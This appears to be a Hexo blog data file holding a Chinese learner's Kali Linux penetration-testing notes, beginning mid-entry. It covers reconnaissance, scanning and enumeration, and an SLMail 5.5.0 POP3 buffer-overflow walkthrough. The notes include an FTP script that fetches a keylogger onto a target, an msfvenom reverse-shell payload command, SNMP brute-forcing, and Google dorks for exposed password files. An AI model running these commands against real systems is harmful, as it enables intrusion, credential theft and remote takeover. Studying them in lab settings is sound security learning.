192.168.0.112 21&gt;ftp.txt<br><span class="hljs-built_in">echo</span> pyrrhax&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> password&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> bin&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET whoami.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET klogger.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">bye</span>&gt;&gt;ftp.txt<br>ftp -s:ftp.txt<br></code></pre></td></tr></table></figure></li><li><p>使用PowerShell下载文件</p></li></ul></li><li><p>使用DEBUG传输文件</p><ul><li>汇编、反汇编</li><li>16进制dump工具</li><li>64k字节</li><li>过程：<ol><li>upx压缩文件</li><li>wine exe2bat.exe nc.exe nc.hex</li><li>debug&lt;nc.hex</li><li>copy 1.dll nc.exe</li></ol></li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>plink.exe 命令行ssh连接工具</li><li>radmin.exe远程控制工具</li><li>sbd 类nc 程序</li><li>可执行文件压缩工具upx</li><li>可执行程序转文本 <code>wine /usr/share/windows-binaries/exe2bat.exe  xxxx.exe xxx.txt</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出</title>
      <link href="/posts/539a87d3.html"/>
      <url>/posts/539a87d3.html</url>
      
        <content type="html"><![CDATA[<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul><li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据</li><li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</li></ul><a id="more"></a><h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈发送半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ul></li></ul><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><ul><li><p>SLMail 5.5.0 Mail Server</p><ul><li>POP3 PASS命令存在缓冲区溢出漏洞</li><li>无需身份验证远程代码执行</li><li>防护机制：<ul><li>DEP: 阻止代码从数据页被执行</li><li>ASLR: 随机内存地址加载执行程序和DLL,每次重启地址变化</li></ul></li></ul><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><ol><li><p>测试PASS命令接收到大量数据时是否会溢出</p></li><li><p>找到精确溢出到EIP的4个字节</p><ul><li><p>二分法 </p></li><li><p>唯一字符串法</p></li></ul></li></ol><ul><li>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2700</li><li>上一条命令即<code>msf-pattern_create -l 2700</code></li><li>然后使用<code>msf-pattern_offset -q Di9D</code></li></ul><ol start="3"><li>找出坏字符</li></ol></li><li><p>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</p><ul><li>返回地址、Shellcode、buffer中都不能出现坏字符</li><li>null (0x00)空字符，用于终止字符串的拷贝操作</li><li>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</li><li>思路：发送0x00-0xff 256个字符，查找所有坏字符</li></ul><ol start="4"><li>重定向数据流</li></ol></li><li><p>用ESP地址替换EIP的值，但是ESP地址变化，不可硬编码。SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</p><ul><li>在内存中寻找地址固定的系统模块，在模块中寻找JMP ESP指令的地址跳转，再由该指令简介跳转到ESP，从而执行shellcode</li><li>mona.py脚本识别内存模块，搜索“return address”是JMP ESP指令的模块</li><li>寻找无DEP、ALSR保护的内存地址</li><li>内存地址不包含坏字符</li></ul></li><li><p>寻找不受保护的系统模块</p><ul><li>!mona modules</li></ul></li><li><p>将汇编指令jmp esp转换为二进制</p><ul><li><code>./nasm_shell.rb</code>或 <code>msf-nasm_shell</code></li><li>FFE4</li></ul></li><li><p>在模块中搜索FFE4指令</p><ul><li><code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code></li><li>选择不包含坏字符的内存地址</li></ul></li><li><p>在该地址设置断点</p></li><li><p>重发buffer</p><ol start="5"><li>生成ShellCode</li></ol></li><li><p>在msfvenom查找相应的payload</p><ul><li><code>msfvenom --list payloads|grep windows|grep reverse_tcp</code></li></ul></li><li><p>查看该Payload生成需要哪些参数</p><ul><li><code>msfvenom -p windows/shell_reverse_tcp --list-options</code></li></ul></li><li><p>生成Payload</p><ul><li><code>msfvenom --platform Windows -b &#39;\x00\x01\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 LPORT=4444 -f py</code></li></ul><ol start="6"><li>在本地侦听4444端口，执行脚本，拿到控制权</li></ol></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>汇编指令<ul><li>JMP XXX         跳转到某寄存器</li><li>ADD XXX,12  XXX寄存器后移12位 </li></ul></li><li>注意fuzzing要步步为营，否则很容易混乱。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLMail缓冲区溢出实践</title>
      <link href="/posts/fd659c4b.html"/>
      <url>/posts/fd659c4b.html</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Windows系统</li><li><a href="https://slmail.software.informer.com/download/" target="_blank" rel="noopener">SLMail5.5.0</a></li><li><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml" target="_blank" rel="noopener">ImmunityDebugger1.85</a></li><li><a href="https://raw.githubusercontent.com/corelan/mona/master/mona.py" target="_blank" rel="noopener">mona.py</a></li></ul><p>mona.py需要放在ImmunityDebugger的安装目录的DebuggerPyCommands文件夹</p><a id="more"></a><p>（国庆节复习来补）</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/posts/b077f1ad.html"/>
      <url>/posts/b077f1ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul><li><p>发现漏洞</p><ul><li>基于端口服务扫描结果版本信息（速度慢）</li><li>搜索已公开的漏洞数据库（数量大）</li><li>使用弱点扫描器实现漏洞管理</li></ul></li><li><p>服务弱点查找</p><ul><li><p>exploit-db</p></li><li><p>rapid7</p></li><li><p><code>searchsploit tomcat</code></p><ul><li>(/usr/share/exploitdb/exploits)</li></ul></li><li><p>shellstorm</p><a id="more"></a></li></ul></li></ul><h2 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h2><ul><li>信息收集：<ul><li>扫描发现网络IP、OS、服务、配置、漏洞</li><li>能力需求：定义扫描方式内容和目标</li></ul></li><li>信息管理<ul><li>格式化信息，并进行筛选、分组、定义优先级</li><li>能力需求：资产分组、指定所有者、向所有者报告漏洞</li></ul></li><li>信息输出<ul><li>向不同层级的人群展示足够的信息量</li><li>能力需求：生成报告、导出数据、与SIEM集成</li></ul></li></ul><h2 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h2><ul><li>主动扫描<ul><li>有身份验证</li><li>无身份验证</li></ul></li><li>被动扫描<ul><li>镜像端口抓包</li><li>其它来源输入</li></ul></li><li>基于Agent的扫描<ul><li>支持平台有限</li></ul></li></ul><h2 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h2><ul><li><p>CVSS(Common Vulnerability Scoring System)</p><ul><li>通用漏洞评分系统——工业标准</li><li>描述安全漏洞严重程度的统一评分方案</li><li>Base Metric:基础的恒定不变的弱点权重</li><li>Temporal Metric:依赖时间因素的弱点权重</li><li>Environmental Metric:利用弱点的环境要求和实施难度的权重</li></ul></li><li><p>CVE(Common Vulnerabilities and Exposures)</p><ul><li><p>已公开的信息安全漏洞字典，统一的漏洞编号标准</p></li><li><p>MITRE公司负责维护（非盈利机构）</p></li><li><p>扫描器的大部分扫描项都对应一个CVE编号</p></li><li><p>实现不同厂商之间信息交换的统一标准</p></li><li><p>CVE发布流程</p><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List——CVE-2008-4250</li><li>MITRE负责对内容进行编辑维护</li></ul></li><li><p>很多厂商维护自己的Vulnerability Reference</p><ul><li>MS</li><li>MSKB</li></ul></li><li><p>其它Vulnerability Reference</p><ul><li>CERT TA08-297A</li><li>BID 31874</li><li>IAVM 2008-A-0081</li><li>OVAL OVAL6093</li></ul></li><li><p>OVAL(Open Vulnerability and Assessment language)</p><ul><li>描述漏洞检测方法的机器可识别语言</li><li>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</li><li>OVAL使用XML语言描述，包含了严密的语法逻辑</li></ul></li><li><p>CCE</p><ul><li>描述软件配置缺陷的标准化格式</li></ul></li><li><p>CPE(Common Product Enumeration)</p><ul><li>信息技术产品，系统，软件包的结构化命名规范分类命名</li></ul></li><li><p>CWE(Common Weakness Enumeration)</p><ul><li>常见漏洞类型的字典</li></ul></li><li><p>SCAP(Security Content Automation Protocol)</p><ul><li>SCAP是一个集合了多重安全标准框架</li><li>六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF</li><li>目的是以标准方法展示和操作安全数据</li><li>由NIST负责维护</li></ul></li></ul><h2 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h2><ul><li>周期性扫描跟踪漏洞</li><li>高危漏洞优先处理</li><li>扫描注意事项</li><li>漏洞管理三要素<ul><li>准确性</li><li>时间</li><li>资源</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-防火墙与负载均衡识别</title>
      <link href="/posts/2b19066a.html"/>
      <url>/posts/2b19066a.html</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li><li>设备多种多样，结果存在一定误差</li><li>Send respond type</li><li>scapy脚本</li><li><code>nmap -sA 192.168.0.117 -p 22</code></li><li><img src="/posts/2b19066a/table.png" alt></li></ul><a id="more"></a><h2 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h2><ul><li>广域网负载均衡<ul><li>DNS轮询，一个DNS对应多个IP</li><li>基于地理位置的DNS解析</li><li>根据解析速度和链路状态的DNS解析</li></ul></li><li>HTTP-Load balancing<ul><li>Nginx</li><li>Apache</li></ul></li></ul><figure class="hljs highlight plain"><figcaption><span>www.baidu.com```(load balancing detect)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lbd"><br><br><br>## WAF识别<br><br>- Web应用防火墙<br><br>- wafw00f -l<br><br>- &#96;&#96;&#96;wafw00f http:&#x2F;&#x2F;www.microsoft.com<br></code></pre></td></tr></table></figure><ul><li><code>nmap www.microsoft.com --script=http-waf-detect.nse</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-OS识别、SNMP、SMB、SMTP扫描</title>
      <link href="/posts/6340eb7a.html"/>
      <url>/posts/6340eb7a.html</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><ul><li>操作系统识别技术<ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li></ul><h3 id="主动识别"><a href="#主动识别" class="headerlink" title="主动识别"></a>主动识别</h3><ul><li>TTL起始值<ul><li>Windows:128(65-128)</li><li>Linux/Unix:64(1-64)</li><li>某些Unix:255</li></ul></li></ul><a id="more"></a><ul><li><p>Scapy脚本</p></li><li><p>nmap使用多种技术识别操作系统</p><figure class="hljs highlight plain"><figcaption><span>-O 192.168.0.114```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nmap"><br>- &#96;&#96;&#96;xprobe2 192.168.0.114<br></code></pre></td></tr></table></figure></li></ul><h3 id="被动识别"><a href="#被动识别" class="headerlink" title="被动识别"></a>被动识别</h3><ul><li><p>IDS</p></li><li><p>抓包分析</p></li><li><p>被动扫描</p></li><li><p>p0f</p><ul><li>结合ARP地址欺骗识别全网OS</li></ul></li></ul><h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><ul><li><p>snmp</p><ul><li>简单网络管理协议161 162端口 (DHCP67 68)</li><li>经常被错误配置</li><li>public /private /manager</li></ul></li><li><p>MIB Tree</p><ul><li>SNMP Management Information Base(MIB)</li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li><li><p><code>onesixtyone 1.1.1.1 public</code>(主要用于目标是不是使用public等若community)</p></li><li><p><code>onesixtyone -c dict.txt -i hosts -o my.log -w 100</code>暴破</p><ul><li><code>dpkg -L onesixtyone</code>找到字典位置</li></ul></li><li><p><code>snmpwalk 192.168.0.114 -c public -v 2c</code></p></li></ul><h3 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h3><ul><li><p>Server Message Block 协议</p><ul><li>微软历史上出现安全问题最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问(SMB1)<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户、组SID</li><li>MS08067</li></ul></li></ul></li><li><p><code>nmap 192.168.1.132 -p139,445 --script=smb-os-discovery.nse</code></p></li><li><p>nmap scripts</p></li><li><p>```nbtscan -r 192.168.0.117``</p></li></ul><h3 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h3><ul><li><p>nc -vn 1.1.1.1 25</p><ul><li>VRFY root</li></ul></li><li><p><code>nmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}</code></p></li><li><p><code>nmap smtp.163.com -p25 -script=smtp-open-realy.nse</code></p></li><li><p><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></p></li><li><p>scapy脚本编写</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-服务扫描</title>
      <link href="/posts/4461e23b.html"/>
      <url>/posts/4461e23b.html</url>
      
        <content type="html"><![CDATA[<h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><ul><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul><a id="more"></a></li></ul><h3 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h3><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner</li><li>另类服务识别方法<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li>SNMP<ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li>识别和绕过防火墙筛选</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul><li><p><code>nc -nv 1.1.1.1 22</code></p></li><li><pre><code class="python"><span class="meta">&gt;&gt;&gt; </span>banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="meta">&gt;&gt;&gt; </span>banner.connect((<span class="string">"192.168.0.114"</span>,<span class="number">21</span>))<span class="meta">&gt;&gt;&gt; </span>banner.recv(<span class="number">4096</span>)<span class="string">'220 (vsFTPd 2.3.4)\r\n'</span><span class="meta">&gt;&gt;&gt; </span>banner.close()<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>- &#96;&#96;&#96;dmitry -pb 192.168.0.114<br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>nmap -sT 192.168.0.114</code></p></li><li><p><code>amap -B 192.168.0.114 21</code></p></li><li><p><code>nmap 192.168.0.114 -p1-100 -sV</code> (最强大且常用)</p></li><li><p><code>amap 192.168.0.114 1-100</code></p></li><li><p><code>amap 192.168.0.114 1-100 -qb</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-端口扫描</title>
      <link href="/posts/4a423c6b.html"/>
      <url>/posts/4a423c6b.html</url>
      
        <content type="html"><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>端口对应网络服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开放的端口</li><li>更具体的攻击面</li></ul><a id="more"></a><h3 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h3><ul><li><p>假设ICMP port-unreachable 响应代表端口关闭</p><ul><li>目标系统不响应ICMP port-unreachable时，可能产生误判</li></ul></li><li><p>Scapy UDP Scan脚本</p><ul><li>端口关闭：unreachable</li><li>端口开放：没有回包</li><li>了解每一种基于UDP的应用层包结构很有帮助</li><li>与三层相同的技术</li><li>误判</li></ul></li><li><p>nmap -sU x.x.x.x  常见1000端口</p></li><li><p>nmap -sU x.x.x.x -p xx 指定端口</p></li></ul><h3 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h3><ul><li>基于连接的协议</li><li>三次握手</li><li>隐蔽扫描（不建立握手）</li><li>僵尸扫描</li><li>全连接扫描</li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li></ul><h4 id="隐蔽扫描——SYN"><a href="#隐蔽扫描——SYN" class="headerlink" title="隐蔽扫描——SYN"></a>隐蔽扫描——SYN</h4><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为——隐蔽</li></ul><h4 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h4><ul><li>极度隐蔽</li><li>实时条件苛刻</li><li>必须可伪造源IP地址</li><li>僵尸机条件：<ul><li>必须是闲置系统</li><li>系统使用递增的IPID（IP包头的id字段）<ul><li>0</li><li>随机</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集--主机发现</title>
      <link href="/posts/2c0ebbb1.html"/>
      <url>/posts/2c0ebbb1.html</url>
      
        <content type="html"><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><ul><li><p>直接与目标系统交互通信</p></li><li><p>无法避免留下访问痕迹</p></li><li><p>使用受控的第三方电脑进行探测</p><ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li><p>扫描</p><ul><li>发送不同的探测，根据返回结果判断目标状态</li></ul><a id="more"></a></li></ul><h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><ul><li>识别活着的主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个IP地址列表</li><li>2、3、4层发现</li></ul><h2 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h2><ul><li><p>优点：扫描速度快，可靠。</p></li><li><p>缺点：不可路由</p></li><li><p>Arp协议</p><ul><li>抓包</li></ul></li><li><p>arping</p></li><li><p>arping 1.1.1.1 -c 1</p><ul><li>编写一个扫描本网段的脚本</li><li>编写一个扫描指定ip列表的脚本</li></ul></li><li><p>nmap -sn（nmap还发了一个反向域名解析请求）</p><ul><li>nmap -sn -iL</li></ul></li><li><p>Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换网络</li><li>主动和被动探测<ul><li>主动：<ul><li>netdiscover -i eth0 -r 1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li><li>被动：<ul><li>netdiscover -p</li></ul></li></ul></li></ul></li><li><p>Scapy</p><ul><li>Python库</li><li>也可作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul></li><li><p>apt-get install python3-gnuplot</p></li><li><p>Scapy</p><ul><li>ARP().display()</li><li>sr1()</li><li>Python脚本</li></ul></li><li><p>在不同的环境下可使用的工具不确定。</p></li></ul><h1 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h1><ul><li><p>优点</p><ul><li>可路由</li><li>速度比较快</li></ul></li><li><p>缺点</p><ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li><p>IP、ICMP协议</p></li><li><p>ping</p></li><li><p>traceroute(发的UDP,IP段的TTL=0后会返回ICMP)，每一跳是路由器的内侧网口</p></li><li><p>ping -R返回的是外侧网口 <a href="https://blog.csdn.net/weixin_42714910/article/details/108351817" target="_blank" rel="noopener">点这里了解更多关于ping -R </a></p><ul><li>编写ping扫描网段脚本</li></ul></li><li><p>Scapy</p><ul><li>分别用shell和python编写ping扫描网段脚本<ul><li>读取文件扫描ip列表</li></ul></li></ul></li><li><p>nmap -sn</p><ul><li>如果ip是本网段的就是二层扫描，否则是三层扫描。</li><li>发送了2个ICMP请求，type是8和13.发送了两个TCP消息，一个443 SYN,一个80 ACK。</li><li>对于每个消息如果目标没有响应就会再发一遍。两遍都没有响应就判定host is down.</li></ul></li><li><p>fping</p><ul><li>fping支持地址段扫描</li><li>fping -g 192.168.1.100 192.168.1.200 -c 1</li></ul></li><li><p>Hping</p><ul><li>能够发送激活任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li></ul></li></ul><h1 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h1><ul><li><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以返现所有端口都被过滤的主机</li></ul></li><li><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li><p>TCP</p><ul><li>未经请求的ACK——RST</li><li>SYN——SYN/ACK、RST</li></ul></li><li><p>UDP</p><ul><li>ICMP端口不可达、一去不复返</li></ul></li><li><p>ACK——TCP Port——RST</p><ul><li>Scapy</li><li>Python脚本</li></ul></li><li><p>nmap - x.x.x.x -PU53333 -sn  UDP扫描53333端口</p></li><li><p>nmap - x.x.x.x -PA53333 -sn  ACK扫描53333端口 (PS PA PU PY(SCTP))</p></li><li><p>hping3 –udp xxx -c 1</p></li></ul><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><ul><li>|egrep -v “xxx”<ul><li>除符合xxx的字段</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking、Recon-ng</title>
      <link href="/posts/16a4daa5.html"/>
      <url>/posts/16a4daa5.html</url>
      
        <content type="html"><![CDATA[<h1 id="搜索引擎使用技巧"><a href="#搜索引擎使用技巧" class="headerlink" title="搜索引擎使用技巧"></a>搜索引擎使用技巧</h1><ul><li><p>+-</p></li><li><p>“ “</p></li><li><p>intitle:</p></li><li><p>intext:</p></li><li><p>site:</p></li><li><p>inurl:</p></li><li><p>filetype:</p><a id="more"></a></li></ul><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>inurl:”level/15/exec/show”</p><p>intitle:”netbotz appliance” “ok”</p><p>inurl:/admin/login.php</p><p>inurl:qq.txt</p><p>filetype:xls “username|password”</p><p>inurl:ftp filetype:xls </p><p>inurl:ftp “password” filetype:xls site:baidu.com</p><h1 id="其它搜索引擎"><a href="#其它搜索引擎" class="headerlink" title="其它搜索引擎"></a>其它搜索引擎</h1><p>duckduckgo</p><p>yandex</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>theHarvester（OSINT gathering）</li><li>metagoofil（search and download specific filetypes）</li><li>Tmux 是一个终端复用器（terminal multiplexer）</li><li>meltago（图形界面）</li></ul><h1 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h1><ul><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web/php" target="_blank" rel="noopener">http://www.archive.org/web/web/php</a></li></ul><h1 id="个人专属密码字典"><a href="#个人专属密码字典" class="headerlink" title="个人专属密码字典"></a>个人专属密码字典</h1><ul><li><p>按个人信息生成其专属的密码字典</p></li><li><p>CUPP——Common User Password Profile</p><ul><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i</li></ul></li></ul><h1 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h1><ul><li><p>Exif图片信息:</p><ul><li>exiftool x.jpg</li></ul></li><li><p>Foca(Windows)</p></li></ul><h1 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h1><ul><li>全特性Web侦察框架</li><li>基于Python开发</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动信息收集-DNS与SHODAN</title>
      <link href="/posts/719bb7fa.html"/>
      <url>/posts/719bb7fa.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><a id="more"></a><h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A、C name、NS、MX、ptr</li></ul></li><li><p>nslookup</p><ul><li>set q=a、ns、mx、any</li><li>server</li><li>nslookup -q=any 163.com </li></ul></li></ul><p>/etc/resolv.conf</p><ul><li>dig<ul><li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li><li>反向查询<code>dig -x xx.x.x.xx</code> </li><li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li></ul></li><li>dig +trace查询过程抓包<ul><li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li><li>向本地DNS服务器查询 X.root-server.net对应的A记录</li><li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li><li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li><li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li><li>向本地DNS服务器查询七个权威域名服务器的A记录</li><li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li></ul></li></ul><h1 